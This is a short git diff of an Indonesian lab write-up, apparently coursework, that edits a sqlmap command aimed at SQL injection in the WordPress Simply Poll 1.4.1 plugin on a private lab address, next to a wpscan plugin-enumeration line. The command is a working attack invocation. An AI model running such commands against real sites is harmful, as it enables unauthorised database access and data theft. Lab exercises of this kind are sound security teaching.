@@ -117,7 +117,7 @@ ruby wpscan.rb --url http://192.168.100.19/wordpress/  --enumerate vp
 
 #### Plugin - Simply Poll 1.4.1
 - Buka terminal pada folder dimana sqlmap berada, jalankan perintah:<pre>
-python sqlmap -u "http://192.168.100.19/wordpress/wp-admin/admin-ajax.php"  --data="action=spAjaxResult&&pollid=iddaripoll" --dbms=mysql --level=5 --risk=3
+python sqlmap -u "http://192.168.100.19/wordpress/wp-admin/admin-ajax.php"  --data="action=spAjaxResult&&pollid=1" --dbms=mysql --level=5 --risk=3
 </pre>
 
 ![simplypol 1](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/simplypoll1.png)
